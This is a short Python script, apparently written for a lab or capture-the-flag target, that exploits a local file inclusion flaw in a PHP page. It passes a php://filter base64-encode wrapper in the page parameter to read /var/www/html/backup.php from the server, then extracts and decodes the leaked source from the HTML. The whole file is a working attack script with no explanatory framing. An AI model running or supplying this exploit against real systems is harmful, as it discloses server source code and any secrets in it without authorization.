import requests
import re
import base64
import binascii


def find_encoded_string(html_content):
    start_index = html_content.rfind('</a>')
    end_index = html_content.rfind('<script>')

    if start_index != -1 and end_index != -1:
        base64_string = html_content[start_index + len('</a>'):end_index].strip()
        return base64_string
    
def decode_and_print(encoded_string):
    # Attempt to decode the provided string
    try:
        decoded_string = base64.b64decode(encoded_string).decode('utf-8')
        print("Decoded String:")
        print(decoded_string)
    except UnicodeDecodeError:
        print("Unable to decode the string with utf-8 encoding.")
        try:
            # Use 'latin-1' encoding as a fallback
            decoded_string = base64.b64decode(encoded_string).decode('latin-1')
            print("Decoded String (latin-1):")
            print(decoded_string)
        except Exception as e:
            print(f"Unable to decode the string: {e}")


def main():
    url = 'http://IP HERE/index.php?page='
    wrapper_payload = 'php://filter/convert.base64-encode/resource='
    file = '/var/www/html/backup.php'

    full_url = f'{url}{wrapper_payload}{file}'

    resp = requests.get(url=full_url)
    encoded_string = find_encoded_string(resp.text)

    if encoded_string:
        decode_and_print(encoded_string)

if __name__ == "__main__":
    main()
